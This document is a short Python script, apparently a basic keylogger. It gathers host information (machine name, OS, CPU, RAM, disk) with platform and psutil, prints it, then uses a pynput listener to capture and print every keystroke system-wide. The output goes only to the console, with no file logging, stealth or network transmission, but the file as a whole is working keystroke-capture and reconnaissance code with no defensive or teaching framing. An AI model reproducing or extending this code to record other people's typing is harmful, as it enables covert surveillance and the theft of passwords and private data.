from pynput.keyboard import Key, Listener
import json
import platform
import psutil
import os
computer_info = {
    "name": platform.node(),
    "system_os": platform.system(),
    "os_version": platform.release(),
    "cpu": platform.processor(),
    "ram": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} G",
    "hard_disk": f"{psutil.disk_usage('/').total / (1024 ** 3):.2f} G"
}


def on_press(key):
    try:
        Key_1 = ('{0}'.format(key.char))
        print(Key_1)
    except AttributeError:
        key_2 = ('{0}'.format(key))
        print(key_2)
print (computer_info)

with Listener(on_press=on_press, on_release=False) as listener:
    listener.join()
